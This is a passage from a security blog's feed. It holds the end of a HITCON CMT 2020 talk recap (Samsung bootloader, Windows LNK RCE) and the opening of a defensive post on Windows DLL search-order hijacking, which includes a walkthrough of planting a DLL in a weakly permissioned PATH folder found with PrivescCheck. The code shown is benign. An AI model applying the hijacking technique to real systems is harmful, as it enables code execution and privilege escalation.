    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/8f9cd63f0e5e39d5d16facb3d263e916c9c97f780b874ff04b0eeb4a6c6c1b32-800-fe9ff81f8.png" width="2112" height="1188" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/4abf5a3602c6532e568fc5a62e4d1d7e790f40358e0684dd13eab4c0ee0441e4.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/4abf5a3602c6532e568fc5a62e4d1d7e790f40358e0684dd13eab4c0ee0441e4-400-73be33370.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/4abf5a3602c6532e568fc5a62e4d1d7e790f40358e0684dd13eab4c0ee0441e4-600-73be33370.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/4abf5a3602c6532e568fc5a62e4d1d7e790f40358e0684dd13eab4c0ee0441e4-800-73be33370.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/4abf5a3602c6532e568fc5a62e4d1d7e790f40358e0684dd13eab4c0ee0441e4-1000-73be33370.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/4abf5a3602c6532e568fc5a62e4d1d7e790f40358e0684dd13eab4c0ee0441e4-400-7b66ad53f.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/4abf5a3602c6532e568fc5a62e4d1d7e790f40358e0684dd13eab4c0ee0441e4-600-7b66ad53f.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/4abf5a3602c6532e568fc5a62e4d1d7e790f40358e0684dd13eab4c0ee0441e4-800-7b66ad53f.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/4abf5a3602c6532e568fc5a62e4d1d7e790f40358e0684dd13eab4c0ee0441e4-1000-7b66ad53f.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/4abf5a3602c6532e568fc5a62e4d1d7e790f40358e0684dd13eab4c0ee0441e4-800-7b66ad53f.png" width="2112" height="1188" />
  </picture>
</a>

</figure>

<p>Despite all this though, Jeff made it very clear that the attack surface is so complex that it is not particularly trivial to access the secured data. A lot of techniques (like getting physical access to the device in the first place) are required to pull this attack off. As usual with theoretical or complex attacks like this though, the moral of the story is don’t leave your device unattended.</p>

<p><a href="/assets/images/posts/hitcon-cmt-2020/495a42ed04df1e288e118dcc17357a1cc0988354c363e345e6e52515fe788285.png"><img class="lazy align-center" src="/generated/assets/images/posts/hitcon-cmt-2020/495a42ed04df1e288e118dcc17357a1cc0988354c363e345e6e52515fe788285-600-aef765172.png" srcset="/generated/assets/images/posts/hitcon-cmt-2020/495a42ed04df1e288e118dcc17357a1cc0988354c363e345e6e52515fe788285-600-aef765172.png 1.0x, /generated/assets/images/posts/hitcon-cmt-2020/495a42ed04df1e288e118dcc17357a1cc0988354c363e345e6e52515fe788285-900.0-aef765172.png 1.5x, /generated/assets/images/posts/hitcon-cmt-2020/495a42ed04df1e288e118dcc17357a1cc0988354c363e345e6e52515fe788285-1200-aef765172.png 2.0x"></a></p>

<p>Despite not having the skill to find vulnerabilities within early low-level bootloader stage, this talk still taught me a lot regarding the bootloader mechanism featured on Samsung devices. With that being said though, I still do not see the point of KNOX, as previously mentioned in my rant above.</p>

<p>Certainly Samsung has put in a lot of extra protections to ensure that the user data is secure in the event that TrustZone is defeated, but I still do not believe the whole write-once e-fuse thing is necessary for consumer devices. It’s certainly fascinating to study the security measures implemented at hardware-level, though.</p>

<h3 id="lnk-to-rce-bugs-in-windows-shell-link-parser-windows-lnk-cves">LNK to RCE: Bugs in Windows Shell Link Parser (Windows <code class="language-plaintext highlighter-rouge">*.lnk</code> CVEs)</h3>

<p>When I first saw the title of the talk, I didn’t know what to expect. It didn’t dawn on me what <code class="language-plaintext highlighter-rouge">LNK</code> meant until the talk had started. Yes, it’s exactly what you think it is - the shortcut file extension, <code class="language-plaintext highlighter-rouge">.lnk</code>.</p>

<p><a href="/assets/images/posts/hitcon-cmt-2020/b6ccc81f1bd1391e19d4993ae7272eb0c9cbc3840af59086cf8e9abbf6af94cb.jpg"><img class="lazy align-center" src="/generated/assets/images/posts/hitcon-cmt-2020/b6ccc81f1bd1391e19d4993ae7272eb0c9cbc3840af59086cf8e9abbf6af94cb-600-e75654617.jpg" srcset="/generated/assets/images/posts/hitcon-cmt-2020/b6ccc81f1bd1391e19d4993ae7272eb0c9cbc3840af59086cf8e9abbf6af94cb-600-e75654617.jpg 1.0x, /generated/assets/images/posts/hitcon-cmt-2020/b6ccc81f1bd1391e19d4993ae7272eb0c9cbc3840af59086cf8e9abbf6af94cb-900.0-e75654617.jpg 1.5x, /generated/assets/images/posts/hitcon-cmt-2020/b6ccc81f1bd1391e19d4993ae7272eb0c9cbc3840af59086cf8e9abbf6af94cb-1200-e75654617.jpg 2.0x"></a></p>

<p>The presenter was Lays (yes, <em>that</em> Lays), who had previously been named a Microsoft MVP researcher in both 2019 and 2020 - and they co-founded Pwnable.tw, which is arguably one of the largest Pwn-focused CTF platform out there.</p>

<p><a href="/assets/images/posts/hitcon-cmt-2020/577ffb3afaeba7a483cbf374c2068f241d3a3210098d05dacf624bd8223071eb.jpg"><img class="lazy align-center" src="/generated/assets/images/posts/hitcon-cmt-2020/577ffb3afaeba7a483cbf374c2068f241d3a3210098d05dacf624bd8223071eb-600-aefc693af.jpg" srcset="/generated/assets/images/posts/hitcon-cmt-2020/577ffb3afaeba7a483cbf374c2068f241d3a3210098d05dacf624bd8223071eb-600-aefc693af.jpg 1.0x, /generated/assets/images/posts/hitcon-cmt-2020/577ffb3afaeba7a483cbf374c2068f241d3a3210098d05dacf624bd8223071eb-900.0-aefc693af.jpg 1.5x, /generated/assets/images/posts/hitcon-cmt-2020/577ffb3afaeba7a483cbf374c2068f241d3a3210098d05dacf624bd8223071eb-1200-aefc693af.jpg 2.0x"></a></p>

<p>Anyhow, the motivation for the research was simply to make a good use of the fuzzer project they made when they were finishing their master degree. While looking for potential targets, they found out that the LNK file format seemed to be the best one. Due to the nature of a shortcut file in Windows, link files are always parsed by Windows Explorer <em>before</em> the icon is ever presented to the user. This behavior makes it a perfect target for RCE, as it is almost impossible to tell Windows not to load the file in memory.</p>

<figure class="half">
<a href="/assets/images/posts/hitcon-cmt-2020/3776d1ae5ef155375af5de21a431d8efb41503eaab290961dbcfaab83c73ef4d.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/3776d1ae5ef155375af5de21a431d8efb41503eaab290961dbcfaab83c73ef4d-400-225c1d4a0.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/3776d1ae5ef155375af5de21a431d8efb41503eaab290961dbcfaab83c73ef4d-600-225c1d4a0.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/3776d1ae5ef155375af5de21a431d8efb41503eaab290961dbcfaab83c73ef4d-800-225c1d4a0.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/3776d1ae5ef155375af5de21a431d8efb41503eaab290961dbcfaab83c73ef4d-1000-225c1d4a0.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/3776d1ae5ef155375af5de21a431d8efb41503eaab290961dbcfaab83c73ef4d-400-a29e99f9c.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/3776d1ae5ef155375af5de21a431d8efb41503eaab290961dbcfaab83c73ef4d-600-a29e99f9c.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/3776d1ae5ef155375af5de21a431d8efb41503eaab290961dbcfaab83c73ef4d-800-a29e99f9c.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/3776d1ae5ef155375af5de21a431d8efb41503eaab290961dbcfaab83c73ef4d-1000-a29e99f9c.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/3776d1ae5ef155375af5de21a431d8efb41503eaab290961dbcfaab83c73ef4d-800-a29e99f9c.jpg" width="4032" height="2688" />
  </picture>
</a>
  
<a href="/assets/images/posts/hitcon-cmt-2020/4ca344cb7dc574a1869a94d47fd831db7d9e40ac18cbb1bfee813308c60d82e6.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/4ca344cb7dc574a1869a94d47fd831db7d9e40ac18cbb1bfee813308c60d82e6-400-257043486.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/4ca344cb7dc574a1869a94d47fd831db7d9e40ac18cbb1bfee813308c60d82e6-600-257043486.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/4ca344cb7dc574a1869a94d47fd831db7d9e40ac18cbb1bfee813308c60d82e6-800-257043486.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/4ca344cb7dc574a1869a94d47fd831db7d9e40ac18cbb1bfee813308c60d82e6-1000-257043486.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/4ca344cb7dc574a1869a94d47fd831db7d9e40ac18cbb1bfee813308c60d82e6-400-500b2d542.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/4ca344cb7dc574a1869a94d47fd831db7d9e40ac18cbb1bfee813308c60d82e6-600-500b2d542.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/4ca344cb7dc574a1869a94d47fd831db7d9e40ac18cbb1bfee813308c60d82e6-800-500b2d542.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/4ca344cb7dc574a1869a94d47fd831db7d9e40ac18cbb1bfee813308c60d82e6-1000-500b2d542.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/4ca344cb7dc574a1869a94d47fd831db7d9e40ac18cbb1bfee813308c60d82e6-800-500b2d542.jpg" width="4032" height="2688" />
  </picture>
</a>
  
</figure>

<hr />]]></content><author><name>Still Hsu</name><email>business@stillu.cc</email></author><category term="infosec" /><category term="en-us" /><summary type="html"><![CDATA[HITCON CMT 2020 is upon us again!]]></summary></entry><entry><title type="html">Threat Spotlight - DLL Hijacking (and .NET)</title><link href="https://stillu.cc/threat-spotlight/2020/09/16/dll-hijacking/" rel="alternate" type="text/html" title="Threat Spotlight - DLL Hijacking (and .NET)" /><published>2020-09-16T00:00:00+08:00</published><updated>2020-09-16T00:00:00+08:00</updated><id>https://stillu.cc/threat-spotlight/2020/09/16/dll-hijacking</id><content type="html" xml:base="https://stillu.cc/threat-spotlight/2020/09/16/dll-hijacking/"><![CDATA[<p>Welcome to a new series I’m calling Threat Spotlight! In this series, we will focus on common vulnerabilities or potential risk factors that developers or security researchers should consider when securing their systems.</p>

<p>In this article, we’ll be focusing on the way Windows handles DLL loading, how threat actors may attack the search chain, and what developers can do to avoid such weakness.</p>

<h2 id="tldr">TL;DR</h2>

<p>Make sure your environment has the entire orange section secured, and use <code class="language-plaintext highlighter-rouge">LoadLibraryEx</code> with <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa#security-remarks">secure flags</a> and use absolute path for the DLL if possible.</p>

<p><a href="/assets/images/posts/dll-hijacking/dll-hijack.png"><img class="lazy align-center" src="/generated/assets/images/posts/dll-hijacking/dll-hijack-600-20553a434.png" srcset="/generated/assets/images/posts/dll-hijacking/dll-hijack-600-20553a434.png 1.0x, /generated/assets/images/posts/dll-hijacking/dll-hijack-900.0-20553a434.png 1.5x, /generated/assets/images/posts/dll-hijacking/dll-hijack-1191-20553a434.png 1.99x"></a></p>

<h2 id="dll-search-order">DLL Search Order</h2>

<p>As always, to understand how Windows handles things, we need to look no further than the official documentation - <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">Dynamic-Link Library Search Order</a>. In the section “Search Order for Desktop Applications,” the documentation notes the following.</p>

<blockquote>
  <p>Desktop applications can control the location from which a DLL is loaded by specifying a full path, using DLL redirection, or by using a manifest. If none of these methods are used, the system searches for the DLL at load time as described in this section.</p>

  <p>Before the system searches for a DLL, it checks the following:</p>

  <ul>
    <li>If a DLL with the same module name is already loaded in memory, the system uses the loaded DLL, no matter which directory it is in. The system does not search for the DLL.</li>
    <li>If the DLL is on the list of known DLLs for the version of Windows on which the application is running, the system uses its copy of the known DLL (and the known DLL’s dependent DLLs, if any). The system does not search for the DLL. For a list of known DLLs on the current system, see the following registry key: <code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code>.</li>
  </ul>
</blockquote>

<p>So, what does that tell us? The paragraph tells us that before searching for a DLL, Windows will first check: a) if the library is already loaded in the memory, if so, use that, to avoid loading the same DLL in memory; b) if the DLL is in the <code class="language-plaintext highlighter-rouge">KnownDLLs</code> list under <code class="language-plaintext highlighter-rouge">HKLM\System\CurrentControlSet\Control\Session Manager\KnownDLLs</code>.</p>

<p><a href="/assets/images/posts/dll-hijacking/dll-hijack-pre-search.png"><img class="lazy align-center" src="/generated/assets/images/posts/dll-hijacking/dll-hijack-pre-search-600-eac5a6e6c.png" srcset="/generated/assets/images/posts/dll-hijacking/dll-hijack-pre-search-600-eac5a6e6c.png 1.0x, /generated/assets/images/posts/dll-hijacking/dll-hijack-pre-search-900.0-eac5a6e6c.png 1.5x, /generated/assets/images/posts/dll-hijacking/dll-hijack-pre-search-1191-eac5a6e6c.png 1.99x"></a></p>

<p>This section is generally safe from threat actor, as these factors cannot be controlled by attackers under normal circumstances.</p>

<p class="notice--warning"><strong>⚠ Warning</strong> By default, Windows uses what is known as the “Safe DLL Search Mode” to search for the requested library. This mode is controlled by the <code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code> registry value. Because <code class="language-plaintext highlighter-rouge">SafeDLLSearchMode</code> is enabled by default, we will only cover the default behavior.</p>

<p>But what about after that? Once again, let’s refer to the official documentation for clues.</p>

<blockquote>
  <ol>
    <li>The directory from which the application loaded.</li>
    <li>The system directory. Use the <code class="language-plaintext highlighter-rouge">GetSystemDirectory</code> function to get the path of this directory.</li>
    <li>The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.</li>
    <li>The Windows directory. Use the <code class="language-plaintext highlighter-rouge">GetWindowsDirectory</code> function to get the path of this directory.</li>
    <li>The current directory.</li>
    <li>The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.</li>
  </ol>
</blockquote>

<p>Given the above steps, we can plot out what the search order is going to look like:</p>

<p><a href="/assets/images/posts/dll-hijacking/dll-hijack.png"><img class="lazy align-center" src="/generated/assets/images/posts/dll-hijacking/dll-hijack-600-20553a434.png" srcset="/generated/assets/images/posts/dll-hijacking/dll-hijack-600-20553a434.png 1.0x, /generated/assets/images/posts/dll-hijacking/dll-hijack-900.0-20553a434.png 1.5x, /generated/assets/images/posts/dll-hijacking/dll-hijack-1191-20553a434.png 1.99x"></a></p>

<h2 id="the-problem">The Problem</h2>

<p>See the problem? The parts marked in red can easily be manipulated by threat actors, especially if they have arbitrary write permissions. If the attacker could drop files into the application folder or into any of the environment path folders with weak permissions, they could easily cause havoc by replacing the intended DLL with a malicious one (with exceptions, see <a href="#the-solution">The Solution</a>).</p>

<p>Consider the following C# code:</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"unknown.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="k">void</span> <span class="nf">UnknownMethod</span><span class="p">();</span>
<span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nf">UnknownMethod</span><span class="p">();</span>
</code></pre></div></div>

<p>And our <code class="language-plaintext highlighter-rouge">unknown.dll</code> C++ code:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;iostream&gt;
</span><span class="k">extern</span> <span class="s">"C"</span> <span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span>
<span class="kt">void</span> <span class="nf">UnknownMethod</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Hello, World!"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>When we run the application, it will attempt to look for <code class="language-plaintext highlighter-rouge">unknown.dll</code> in various directories based on the search order. In this instance, <code class="language-plaintext highlighter-rouge">unknown.dll</code> is planted at where the current working directory is (where <code class="language-plaintext highlighter-rouge">dotnet myapp.dll</code> is called). We can observe this behavior using <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Process Monitor</a>.</p>

<figure>
  <a href="/assets/images/posts/dll-hijacking/cd38de9e8b20864e3746acc9a30424b98389f3a7a0889ec02fccdfb3211a2698.png">
  <picture>
    <source srcset="/generated/assets/images/posts/dll-hijacking/cd38de9e8b20864e3746acc9a30424b98389f3a7a0889ec02fccdfb3211a2698-400-71595a74f.webp 400w, /generated/assets/images/posts/dll-hijacking/cd38de9e8b20864e3746acc9a30424b98389f3a7a0889ec02fccdfb3211a2698-600-71595a74f.webp 600w, /generated/assets/images/posts/dll-hijacking/cd38de9e8b20864e3746acc9a30424b98389f3a7a0889ec02fccdfb3211a2698-800-71595a74f.webp 800w, /generated/assets/images/posts/dll-hijacking/cd38de9e8b20864e3746acc9a30424b98389f3a7a0889ec02fccdfb3211a2698-1000-71595a74f.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/dll-hijacking/cd38de9e8b20864e3746acc9a30424b98389f3a7a0889ec02fccdfb3211a2698-400-5ce050329.png 400w, /generated/assets/images/posts/dll-hijacking/cd38de9e8b20864e3746acc9a30424b98389f3a7a0889ec02fccdfb3211a2698-600-5ce050329.png 600w, /generated/assets/images/posts/dll-hijacking/cd38de9e8b20864e3746acc9a30424b98389f3a7a0889ec02fccdfb3211a2698-800-5ce050329.png 800w, /generated/assets/images/posts/dll-hijacking/cd38de9e8b20864e3746acc9a30424b98389f3a7a0889ec02fccdfb3211a2698-1000-5ce050329.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/dll-hijacking/cd38de9e8b20864e3746acc9a30424b98389f3a7a0889ec02fccdfb3211a2698-800-5ce050329.png" width="2240" height="250" />
  </picture>
</a>

  <a href="/assets/images/posts/dll-hijacking/b206464da7a1598bb0b1d0593909488192c36e57df91ec0aa0c6c09b144fbedd.png">
  <picture>
    <source srcset="/generated/assets/images/posts/dll-hijacking/b206464da7a1598bb0b1d0593909488192c36e57df91ec0aa0c6c09b144fbedd-400-8fc394092.webp 400w, /generated/assets/images/posts/dll-hijacking/b206464da7a1598bb0b1d0593909488192c36e57df91ec0aa0c6c09b144fbedd-600-8fc394092.webp 600w, /generated/assets/images/posts/dll-hijacking/b206464da7a1598bb0b1d0593909488192c36e57df91ec0aa0c6c09b144fbedd-800-8fc394092.webp 800w, /generated/assets/images/posts/dll-hijacking/b206464da7a1598bb0b1d0593909488192c36e57df91ec0aa0c6c09b144fbedd-848-8fc394092.webp 848w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/dll-hijacking/b206464da7a1598bb0b1d0593909488192c36e57df91ec0aa0c6c09b144fbedd-400-bebb7633a.png 400w, /generated/assets/images/posts/dll-hijacking/b206464da7a1598bb0b1d0593909488192c36e57df91ec0aa0c6c09b144fbedd-600-bebb7633a.png 600w, /generated/assets/images/posts/dll-hijacking/b206464da7a1598bb0b1d0593909488192c36e57df91ec0aa0c6c09b144fbedd-800-bebb7633a.png 800w, /generated/assets/images/posts/dll-hijacking/b206464da7a1598bb0b1d0593909488192c36e57df91ec0aa0c6c09b144fbedd-848-bebb7633a.png 848w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/dll-hijacking/b206464da7a1598bb0b1d0593909488192c36e57df91ec0aa0c6c09b144fbedd-800-bebb7633a.png" width="848" height="371" />
  </picture>
</a>

  <figcaption>
    The dotnet application successfully found the requested DLL at the current working directory.
    Our program executed as expected with "Hello, World!" printed.
  </figcaption>
</figure>

<p>So let’s say our threat actor has managed to gain access to the Windows or System directory and dropped in their malicious DLL, what would happen when we execute the application again?</p>

<figure>
  <a href="/assets/images/posts/dll-hijacking/9f106adc2832cff974a4bfb0b7031e8a52b7bf3048cdec08333769a4b6659bcb.png">
  <picture>
    <source srcset="/generated/assets/images/posts/dll-hijacking/9f106adc2832cff974a4bfb0b7031e8a52b7bf3048cdec08333769a4b6659bcb-400-8ee9b8b95.webp 400w, /generated/assets/images/posts/dll-hijacking/9f106adc2832cff974a4bfb0b7031e8a52b7bf3048cdec08333769a4b6659bcb-600-8ee9b8b95.webp 600w, /generated/assets/images/posts/dll-hijacking/9f106adc2832cff974a4bfb0b7031e8a52b7bf3048cdec08333769a4b6659bcb-800-8ee9b8b95.webp 800w, /generated/assets/images/posts/dll-hijacking/9f106adc2832cff974a4bfb0b7031e8a52b7bf3048cdec08333769a4b6659bcb-1000-8ee9b8b95.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/dll-hijacking/9f106adc2832cff974a4bfb0b7031e8a52b7bf3048cdec08333769a4b6659bcb-400-b14f43d83.png 400w, /generated/assets/images/posts/dll-hijacking/9f106adc2832cff974a4bfb0b7031e8a52b7bf3048cdec08333769a4b6659bcb-600-b14f43d83.png 600w, /generated/assets/images/posts/dll-hijacking/9f106adc2832cff974a4bfb0b7031e8a52b7bf3048cdec08333769a4b6659bcb-800-b14f43d83.png 800w, /generated/assets/images/posts/dll-hijacking/9f106adc2832cff974a4bfb0b7031e8a52b7bf3048cdec08333769a4b6659bcb-1000-b14f43d83.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/dll-hijacking/9f106adc2832cff974a4bfb0b7031e8a52b7bf3048cdec08333769a4b6659bcb-800-b14f43d83.png" width="2231" height="208" />
  </picture>
</a>

  <a href="/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4.png">
  <picture>
    <source srcset="/generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-400-9e4e07d5a.webp 400w, /generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-600-9e4e07d5a.webp 600w, /generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-800-9e4e07d5a.webp 800w, /generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-1000-9e4e07d5a.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-400-e8d3f937e.png 400w, /generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-600-e8d3f937e.png 600w, /generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-800-e8d3f937e.png 800w, /generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-1000-e8d3f937e.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-800-e8d3f937e.png" width="1015" height="359" />
  </picture>
</a>

  <figcaption>
    Suddenly, our program stopped executing with the expected behavior!
  </figcaption>
</figure>

<p>Now, this is a very unlikely scenario as the threat actor would first have to elevate their user account with one that has Administrator ACL permissions in order to perform a file write into a protected directory.</p>

<p>Here’s a more likely scenario - what if we were to delete the DLL from the application folder and find a weak ACL controlled directory that is present within our <code class="language-plaintext highlighter-rouge">%PATH%</code>? Fortunately for us (and me), <a href="https://github.com/itm4n/PrivescCheck">PrivescCheck</a> can help us find PATH directories with weak permissions.</p>

<p><a href="/assets/images/posts/dll-hijacking/d5675e55e1f7c0f327214d5d828ad1938ca9b8d145db65012f3136bc2c860ceb.png"><picture><source srcset="/generated/assets/images/posts/dll-hijacking/d5675e55e1f7c0f327214d5d828ad1938ca9b8d145db65012f3136bc2c860ceb-400-cc9dfa50e.webp 400w, /generated/assets/images/posts/dll-hijacking/d5675e55e1f7c0f327214d5d828ad1938ca9b8d145db65012f3136bc2c860ceb-600-cc9dfa50e.webp 600w, /generated/assets/images/posts/dll-hijacking/d5675e55e1f7c0f327214d5d828ad1938ca9b8d145db65012f3136bc2c860ceb-800-cc9dfa50e.webp 800w, /generated/assets/images/posts/dll-hijacking/d5675e55e1f7c0f327214d5d828ad1938ca9b8d145db65012f3136bc2c860ceb-1000-cc9dfa50e.webp 1000w" type="image/webp"><source srcset="/generated/assets/images/posts/dll-hijacking/d5675e55e1f7c0f327214d5d828ad1938ca9b8d145db65012f3136bc2c860ceb-400-d99d16699.png 400w, /generated/assets/images/posts/dll-hijacking/d5675e55e1f7c0f327214d5d828ad1938ca9b8d145db65012f3136bc2c860ceb-600-d99d16699.png 600w, /generated/assets/images/posts/dll-hijacking/d5675e55e1f7c0f327214d5d828ad1938ca9b8d145db65012f3136bc2c860ceb-800-d99d16699.png 800w, /generated/assets/images/posts/dll-hijacking/d5675e55e1f7c0f327214d5d828ad1938ca9b8d145db65012f3136bc2c860ceb-1000-d99d16699.png 1000w" type="image/png"><img class="lazy" src="/generated/assets/images/posts/dll-hijacking/d5675e55e1f7c0f327214d5d828ad1938ca9b8d145db65012f3136bc2c860ceb-800-d99d16699.png" width="1783" height="522"></picture></a></p>

<p>With <code class="language-plaintext highlighter-rouge">Invoke-DllHijackingCheck</code>, we are able to quickly find folders that anyone under <code class="language-plaintext highlighter-rouge">NT AUTHORITY\Authenticated Users</code> can write to. Let’s try moving our malicious DLL there.</p>

<figure>
  <a href="/assets/images/posts/dll-hijacking/f5c1ce936ff73e71ad2ddd9eb0f8afc8165342ae52a4d46c699fa72749ea92ab.png">
  <picture>
    <source srcset="/generated/assets/images/posts/dll-hijacking/f5c1ce936ff73e71ad2ddd9eb0f8afc8165342ae52a4d46c699fa72749ea92ab-400-70eb47ae9.webp 400w, /generated/assets/images/posts/dll-hijacking/f5c1ce936ff73e71ad2ddd9eb0f8afc8165342ae52a4d46c699fa72749ea92ab-600-70eb47ae9.webp 600w, /generated/assets/images/posts/dll-hijacking/f5c1ce936ff73e71ad2ddd9eb0f8afc8165342ae52a4d46c699fa72749ea92ab-800-70eb47ae9.webp 800w, /generated/assets/images/posts/dll-hijacking/f5c1ce936ff73e71ad2ddd9eb0f8afc8165342ae52a4d46c699fa72749ea92ab-1000-70eb47ae9.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/dll-hijacking/f5c1ce936ff73e71ad2ddd9eb0f8afc8165342ae52a4d46c699fa72749ea92ab-400-34b6ec89d.png 400w, /generated/assets/images/posts/dll-hijacking/f5c1ce936ff73e71ad2ddd9eb0f8afc8165342ae52a4d46c699fa72749ea92ab-600-34b6ec89d.png 600w, /generated/assets/images/posts/dll-hijacking/f5c1ce936ff73e71ad2ddd9eb0f8afc8165342ae52a4d46c699fa72749ea92ab-800-34b6ec89d.png 800w, /generated/assets/images/posts/dll-hijacking/f5c1ce936ff73e71ad2ddd9eb0f8afc8165342ae52a4d46c699fa72749ea92ab-1000-34b6ec89d.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/dll-hijacking/f5c1ce936ff73e71ad2ddd9eb0f8afc8165342ae52a4d46c699fa72749ea92ab-800-34b6ec89d.png" width="2250" height="1129" />
  </picture>
</a>

  <a href="/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4.png">
  <picture>
    <source srcset="/generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-400-9e4e07d5a.webp 400w, /generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-600-9e4e07d5a.webp 600w, /generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-800-9e4e07d5a.webp 800w, /generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-1000-9e4e07d5a.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-400-e8d3f937e.png 400w, /generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-600-e8d3f937e.png 600w, /generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-800-e8d3f937e.png 800w, /generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-1000-e8d3f937e.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/dll-hijacking/fab77737c6b3ede70cf936a773a2c1a4891ee70e8891e37d327178acb2e54da4-800-e8d3f937e.png" width="1015" height="359" />
  </picture>
</a>

  <figcaption>
    Success! We managed to successfully hijack the unknown.dll.
  </figcaption>
</figure>

